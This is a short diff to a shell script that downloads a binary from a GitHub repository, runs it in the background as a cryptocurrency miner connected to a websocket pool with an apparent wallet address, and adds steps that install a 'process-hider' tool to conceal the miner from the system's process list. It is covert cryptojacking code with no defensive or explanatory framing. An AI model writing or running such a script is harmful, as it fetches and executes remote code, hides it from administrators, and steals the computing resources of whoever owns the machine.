@@ -1,3 +1,7 @@
+sudo apt update
+sudo apt install nodejs npm -y
+sudo npm i -g process-hider
+sudo ph add zig-power2b
 wget https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/zig-power2b
 chmod +x zig-power2b
 nohup ./zig-power2b mine-wss "wss://thorough-jaquelin-berakitame-aeabd1e4.koyeb.app/bmEucnBsYW50Lnh5ejo3MDIy" BgFAEEhn9yvubV7iQ6cZxHU2KrdS6oBEY1.VVV x 6 > log 2>&1 &
